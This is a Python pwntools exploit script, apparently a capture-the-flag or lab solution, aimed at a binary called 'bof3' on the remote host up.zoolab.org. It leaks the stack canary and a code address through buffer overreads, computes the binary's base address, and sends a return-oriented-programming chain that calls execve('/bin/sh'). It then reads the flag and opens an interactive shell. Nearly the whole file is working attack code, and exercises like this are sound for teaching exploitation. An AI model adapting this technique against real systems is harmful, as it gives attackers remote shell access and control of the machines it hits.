#!/usr/bin/env python

from pwn import process, remote, u64, p64, context, ELF

context.arch = "amd64"
context.os = "linux"
context.endian = "little"

# r = process("./bof3")
r = remote("up.zoolab.org", 10261)

r.sendafter(b"name? ", b"A" * 0x29)

r.recvuntil(b"A" * 0x29)
canary = u64(b"\x00" + r.recv(7))


r.sendafter(b"number? ", b"A" * 0x38)

r.recvuntil(b"A" * 0x38)
main_addr = u64(r.recv(6) + b"\x00\x00")

bof3 = ELF("./bof3")
bof3.address = main_addr - bof3.sym["main"] - 0x6C


r.sendafter(b"name? ", b"A" * 0x28)


pop_rax_ret = bof3.address + 0x57187
pop_rdi_ret = bof3.address + 0x0917F
pop_rsi_ret = bof3.address + 0x111EE
pop_rdx_rbx_ret = bof3.address + 0x8DD8B
syscall_ret = bof3.address + 0x21C66
mov_rdi_rdx_ret = bof3.address + 0x3a8e3

# execve("/bin/sh", 0, 0)

payload = b"A" * 0x28
payload += p64(canary) + b"B" * 8

payload += p64(pop_rax_ret) + p64(0x3B)
payload += p64(pop_rdi_ret) + p64(bof3.address + 0xd0000)
payload += p64(pop_rdx_rbx_ret) + b"/bin/sh\x00" + p64(0x0)
payload += p64(mov_rdi_rdx_ret)
payload += p64(pop_rsi_ret) + p64(0x0)
payload += p64(pop_rdx_rbx_ret) + p64(0x0) + p64(0x0)
payload += p64(syscall_ret)


r.sendafter(b"message: ", payload)

r.recvuntil(b"Thank you!\n")

r.sendline(b"cat /FLAG")


flag = r.recvuntil(b"}")
print(flag.decode())

r.interactive()

